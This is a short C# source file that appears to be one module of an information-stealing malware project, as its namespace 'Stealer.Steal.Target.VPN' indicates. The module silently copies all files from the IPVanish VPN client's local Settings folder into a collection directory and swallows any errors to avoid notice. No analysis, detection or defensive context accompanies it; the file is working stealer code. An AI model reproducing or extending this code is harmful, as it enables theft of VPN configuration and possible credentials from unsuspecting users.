using System;
using System.IO;
using Stealer.Steal.Helper;

namespace Stealer.Steal.Target.VPN;

internal class IpVanish
{
	public static void Start()
	{
		try
		{
			string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "IPVanish", "Settings");
			if (Directory.Exists(path))
			{
				string[] files = Directory.GetFiles(path);
				foreach (string path2 in files)
				{
					DynamicFiles.WriteAllBytes(Path.Combine("VPN", "IPVanish", Path.GetFileName(path2)), File.ReadAllBytes(path2));
				}
			}
		}
		catch
		{
		}
	}
}
